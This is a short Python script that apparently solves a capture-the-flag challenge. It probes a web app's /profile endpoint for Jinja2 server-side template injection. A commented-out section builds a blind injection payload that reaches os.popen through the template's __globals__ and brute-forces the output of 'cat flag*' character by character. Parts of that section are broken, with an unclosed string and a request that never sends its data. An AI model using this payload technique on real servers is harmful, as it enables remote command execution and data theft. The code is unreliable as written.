import string
import requests
import signal
import sys
import os
#from Helpers import *
#from Brute import *

TARGET_URL = "http://gc1.eng.run:31888"
success = requests.get(f"{TARGET_URL}/profile?name=a&bio={{%25+if+True+%25}}1{{%25+endif+%25}}&position=d").text
fail = requests.get(f"{TARGET_URL}/profile?name=a&bio={{%25+if+False+%25}}1{{%25+endif+%25}}&position=d").text
print(success)
print(fail)
'''
def req(cmd, ch, i):
    i = i+1
    exploit = "{% if self[request['form']['t']]['cycler'][request['form']['i']][request['form']['g']]['os']['popen']('"+cmd+"| cut -c"+str(i)+"')['read']() == '"+ch+"\n' %}1{% endif %}"
    # print(exploit)
    data = f"bio={exploit}&name=a&position=b&t=_TemplateReference__context&i=__init__&g=__globals__
    res = requests.get(f"{TARGET_URL}/profile?")
    # print(res.text)
    if res.text == success:
        return True


    elif res.text == fail:
        return False
    else:
        print(res.text)


def menu():
    options = Helpers.getOptions()
    options['checkChar'] = lambda i, ch: req("cat flag*|tr \"\\n\" \" \"", ch, i)
    options['len'] = 41
    options['charset'] = string.ascii_letters+string.digits+"}{_*#$"
    brute = Brute(**options)
    #req("echo -n 1",'1',1)
    flag = brute.run(5)
    print(flag)
'''
#menu()